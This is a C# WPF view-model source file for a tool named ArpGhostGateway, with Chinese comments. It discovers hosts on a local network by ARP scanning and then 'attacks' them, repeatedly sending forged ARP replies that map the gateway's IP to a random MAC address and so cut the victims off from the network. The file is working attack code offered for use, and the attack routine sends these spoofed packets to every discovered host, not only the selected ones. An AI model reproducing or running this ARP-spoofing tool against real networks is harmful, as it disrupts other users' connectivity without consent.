using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace ArpGhostGateway
{
    public class MainWindowViewModel : ObservableObject
    {
        private readonly TimeSpan _timeout = new TimeSpan(0, 0, 2);
        private readonly CancellationTokenSource _cancellationTokenSource; //取消scan的token
        private readonly CancellationTokenSource _cancellationTokenSource1;//取消攻击的token

        /// <summary>
        /// 所有的网卡设备集合
        /// </summary>
        private ObservableCollection<LibPcapLiveDevice> _libPcapLiveDevices;
        public ObservableCollection<LibPcapLiveDevice> LibPcapLiveDevices
        {
            get { return _libPcapLiveDevices; }
            set { SetProperty(ref _libPcapLiveDevices, value); }
        }

        // <summary>
        /// 局域网主机
        /// </summary>
        private ObservableCollection<Computer> _computers;
        public ObservableCollection<Computer> Computers
        {
            get { return _computers; }
            set { SetProperty(ref _computers, value); }
        }

        /// <summary>
        /// 当前选中的网卡设备
        /// </summary>
        private LibPcapLiveDevice _libPcapLiveDevice;
        public LibPcapLiveDevice LibPcapLiveDevice
        {
            get { return _libPcapLiveDevice; }
            set { SetProperty(ref _libPcapLiveDevice, value); }
        }

        /// <summary>
        /// 本机ip
        /// </summary>
        private IPAddress _localIp;
        public IPAddress LocalIp
        {
            get { return _localIp; }
            set { SetProperty(ref _localIp, value); LocalIpText = value?.ToString(); }
        }

        /// <summary>
        /// 本机mac地址
        /// </summary>
        private PhysicalAddress _localMac;
        public PhysicalAddress LocalMac
        {
            get { return _localMac; }
            set { SetProperty(ref _localMac, value); LocalMacText = value?.ToString(); }
        }

        /// <summary>
        /// 网关ip
        /// </summary>
        private IPAddress _gatewayIp;
        public IPAddress GatewayIp
        {
            get { return _gatewayIp; }
            set { SetProperty(ref _gatewayIp, value); GatewayIpText = value?.ToString(); }
        }

        /// <summary>
        /// 网关mac地址
        /// </summary>
        private PhysicalAddress _gatewayMac;
        public PhysicalAddress GatewayMac
        {
            get { return _gatewayMac; }
            set { SetProperty(ref _gatewayMac, value); GatewayMacText = value?.ToString(); }
        }

        private string _localIpText;
        public string LocalIpText 
        {
            get { return _localIpText; }
            set { SetProperty(ref _localIpText, value); }
        }

        private string _localMacText;
        public string LocalMacText
        {
            get { return _localMacText; }
            set { SetProperty(ref _localMacText, value); }
        }

        private string _gatewayIpText;
        public string GatewayIpText
        {
            get { return _gatewayIpText; }
            set { SetProperty(ref _gatewayIpText, value); }
        }

        private string _gatewayMacText;
        public string GatewayMacText
        {
            get { return _gatewayMacText; }
            set { SetProperty(ref _gatewayMacText, value); }
        }

        /// <summary>
        /// 起始ip
        /// </summary>
        private string _startIpAddress;
        public string StartIpAddress
        {
            get { return _startIpAddress; }
            set { SetProperty(ref _startIpAddress, value); }
        }

        /// <summary>
        /// 终点ip
        /// </summary>
        private string _endIpAddress;
        public string EndIpAddress
        {
            get { return _endIpAddress; }
            set { SetProperty(ref _endIpAddress, value); }
        }
        
        public RelayCommand LoadedCommand { get; set; }
        public RelayCommand ShiftDeviceCommand { get; set; }
        public AsyncRelayCommand ScanCommand { get; set; }
        public RelayCommand CallTargetComputerCommand { get; set; } //攻击目标主机

        public MainWindowViewModel()
        {
            LoadedCommand = new RelayCommand(Loaded);
            ShiftDeviceCommand = new RelayCommand(ShiftDevice);
            ScanCommand = new AsyncRelayCommand(ScanAsync);
            CallTargetComputerCommand = new RelayCommand(CallTargetComputer);
            _cancellationTokenSource = new CancellationTokenSource();
            _cancellationTokenSource1 = new CancellationTokenSource();
        }

        /// <summary>
        /// 加载页面触发事件
        /// </summary>
        private void Loaded()
        {
            LibPcapLiveDevices = new ObservableCollection<LibPcapLiveDevice>(LibPcapLiveDeviceList.Instance);
            if (LibPcapLiveDevices.Count < 0)
            {
                LibPcapLiveDevice = null;
                MessageBox.Show("网卡数量不足", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            LibPcapLiveDevice = LibPcapLiveDevices.FirstOrDefault();
            ShiftDevice();
        }

        /// <summary>
        /// 切换网卡事件
        /// </summary>
        private void ShiftDevice()
        {
            if (LibPcapLiveDevice == null)
                return;

            foreach (var address in LibPcapLiveDevice.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6)
                {
                    // make sure the address is ipv4
                    if (address.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        LocalIp = address.Addr.ipAddress;
                        break; // break out of the foreach
                    }
                }
            }

            foreach (var address in LibPcapLiveDevice.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.HARDWARE)
                {
                    LocalMac = address.Addr.hardwareAddress; // 本机MAC
                }
            }

            var gw = LibPcapLiveDevice.Interface.GatewayAddresses; // 网关IP
            //ipv4的gateway
            GatewayIp = gw.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork);
            StartIpAddress = GatewayIp.ToString();
            EndIpAddress = GatewayIp.ToString();
            GatewayMac = Resolve(GatewayIp);
        }

        /// <summary>
        /// 扫描局域网
        /// </summary>
        private async Task ScanAsync() 
        {
            IPAddress startIP, endIP;
            if (!IPAddress.TryParse(StartIpAddress, out startIP) || !IPAddress.TryParse(EndIpAddress, out endIP))
            {
                MessageBox.Show("不合法的IP地址");
                return;
            }

            IPObject start = new IPObject(startIP);
            IPObject end = new IPObject(endIP);
            if (!start.SmallerThan(end))
            {
                MessageBox.Show("起始地址大于结束地址");
                return;
            }

            await ScanLanAsync(start, end);
        }

        /// <summary>
        /// 获取ip的mac地址
        /// </summary>
        /// <param name="destIP"></param>
        /// <returns></returns>
        public PhysicalAddress Resolve(IPAddress destIP)
        {
            var request = BuildRequest(destIP, LocalMac, LocalIp);
            //create a "tcpdump" filter for allowing only arp replies to be read
            string arpFilter = "arp and ether dst " + LocalMac.ToString();
            //open the device with 20ms timeout
            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            //set the filter
            LibPcapLiveDevice.Filter = arpFilter;
            // set a last request time that will trigger sending the
            // arp request immediately
            var lastRequestTime = DateTime.FromBinary(0);
            var requestInterval = TimeSpan.FromMilliseconds(200);

            ArpPacket arpPacket = null;
            var timeoutDateTime = DateTime.Now + _timeout;
            while (DateTime.Now < timeoutDateTime)
            {
                if (requestInterval < (DateTime.Now - lastRequestTime))
                {
                    // inject the packet to the wire
                    LibPcapLiveDevice.SendPacket(request);
                    lastRequestTime = DateTime.Now;
                }

                //read the next packet from the network
                if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0) 
                {
                    if (packet.Device.LinkType != LinkLayers.Ethernet)
                    {
                        continue;
                    }
                    var pack = Packet.ParsePacket(packet.Device.LinkType, packet.Data.ToArray());
                    arpPacket = pack.Extract<ArpPacket>();
                    if (arpPacket == null) //is this an arp packet?
                    {
                        continue;
                    }

                    if (arpPacket.SenderProtocolAddress.Equals(destIP))
                    {
                        break;
                    }
                }
            }

            // free the device
            LibPcapLiveDevice.Close();
            return arpPacket?.SenderHardwareAddress;
        }

        /// <summary>
        /// 扫描局域网的主机
        /// </summary>
        /// <param name="startIP">起始ip</param>
        /// <param name="endIP">终点ip</param>
        public async Task ScanLanAsync(IPObject startIP, IPObject endIP)
        {
            var targetIPList = new List<IPAddress>();
            Computers = new ObservableCollection<Computer>();
            while (!startIP.Equals(endIP))
            {
                targetIPList.Add(startIP.IPAddress);
                startIP.AddOne();
            }
            var arpPackets = new Packet[targetIPList.Count];
            for (int i = 0; i < arpPackets.Length; ++i)
            {
                arpPackets[i] = BuildRequest(targetIPList[i], LocalMac, LocalIp);
            }
            string arpFilter = "arp and ether dst " + LocalMac.ToString();
            //open the device with 20ms timeout
            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            LibPcapLiveDevice.Filter = arpFilter;
            await Task.Run(() =>
            {
                for (int i = 0; i < arpPackets.Length; ++i)
                {
                    if (_cancellationTokenSource.IsCancellationRequested) 
                    {
                        break;
                    }
                    var lastRequestTime = DateTime.FromBinary(0);
                    var requestInterval = TimeSpan.FromMilliseconds(200);
                    var timeoutDateTime = DateTime.Now + _timeout;
                    while (DateTime.Now < timeoutDateTime)
                    {
                        if (_cancellationTokenSource.IsCancellationRequested)
                        {
                            break;
                        }

                        if (requestInterval < (DateTime.Now - lastRequestTime))
                        {
                            LibPcapLiveDevice.SendPacket(arpPackets[i]);
                            lastRequestTime = DateTime.Now;
                        }

                        if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0)
                        {
                            if (packet.Device.LinkType != LinkLayers.Ethernet)
                            {
                                continue;
                            }
                            var pack = Packet.ParsePacket(packet.Device.LinkType, packet.Data.ToArray());
                            // is this an arp packet?
                            var arpPacket = pack.Extract<ArpPacket>();
                            if (arpPacket == null)
                            {
                                continue;
                            }

                            //if this is the reply we're looking for, stop
                            if (arpPacket.SenderProtocolAddress.Equals(targetIPList[i]))
                            {
                                Application.Current.Dispatcher.Invoke(() =>
                                {
                                    Computers.Add(new Computer()
                                    {
                                        IPAddress = arpPacket.SenderProtocolAddress.ToString(),
                                        MacAddress = arpPacket.SenderHardwareAddress?.ToString(),
                                    });
                                });

                                break;
                            }
                        }
                    }
                }

                LibPcapLiveDevice.Close();
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MessageBox.Show("扫描完成");
                });
            }, _cancellationTokenSource.Token);
        }

        private void CallTargetComputer() 
        {
            if (Computers == null || Computers.All(x => !x.IsSelected))
            {
                MessageBox.Show("没有合适的目标攻击主机");
                return;
            }
            
            var target = Computers.Where(x => x.IsSelected);
            var wrongMAC = GetRandomPhysicalAddress();
            foreach (var compute in Computers)
            {
                var packet = BuildResponse(IPAddress.Parse(compute.IPAddress),PhysicalAddress.Parse(compute.MacAddress),GatewayIp, wrongMAC);
                LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
                var _ = Task.Run(async () =>
                {
                    while (true)
                    {
                        if (_cancellationTokenSource1.IsCancellationRequested) 
                        {
                            break;
                        }
                        LibPcapLiveDevice.SendPacket(packet);
                        await Task.Delay(1000);
                    }

                    LibPcapLiveDevice.Close();
                    MessageBox.Show("攻击结束");
                }, _cancellationTokenSource1.Token);
            }
        }

        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
        {
            var ethernetPacket = new EthernetPacket(localMac, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.Arp);
            var arpPacket = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), destinationIP, localMac, localIP);

            // the arp packet is the payload of the ethernet packet
            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }
        private Packet BuildResponse(IPAddress destIP, PhysicalAddress destMac, IPAddress senderIP, PhysicalAddress senderMac)
        {
            // an arp packet is inside of an ethernet packet
            var ethernetPacket = new EthernetPacket(senderMac, destMac, EthernetType.Arp);
            var arpPacket = new ArpPacket(ArpOperation.Response, destMac, destIP, senderMac, senderIP);

            // the arp packet is the payload of the ethernet packet
            ethernetPacket.PayloadPacket = arpPacket;
            return ethernetPacket;
        }

        /// <summary>
        /// 生成随机mac地址
        /// </summary>
        /// <returns></returns>
        private PhysicalAddress GetRandomPhysicalAddress()
        {
            Random random = new Random(Environment.TickCount);
            byte[] macBytes = new byte[] { 0x9C, 0x21, 0x6A, 0xC3, 0xB0, 0x27 };
            macBytes[5] = (byte)random.Next(255);
            return new PhysicalAddress(macBytes);
        }
    }

    public class Computer
    {
        public string IPAddress { get; set; }
        public string MacAddress { get; set; }
        public bool IsSelected { get; set; }
    }
}
